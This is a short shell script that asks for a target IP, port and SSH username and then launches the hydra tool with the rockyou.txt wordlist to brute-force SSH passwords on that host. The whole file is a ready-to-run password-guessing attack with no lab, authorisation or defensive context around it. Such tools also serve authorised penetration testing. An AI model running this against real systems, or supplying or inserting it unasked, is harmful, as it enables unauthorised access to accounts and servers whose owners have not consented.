#!/bin/sh

echo "Enter Target IP: "

read TARGET

echo "Enter Port number: "

read PORT

echo "Enter SSH username: "

read UNAME

echo "TARGET: $TARGET"
echo "USERNAME: $UNAME"



hydra -V -l $UNAME -P "/usr/share/wordlists/rockyou.txt" $TARGET ssh -t 4 -s $PORT 
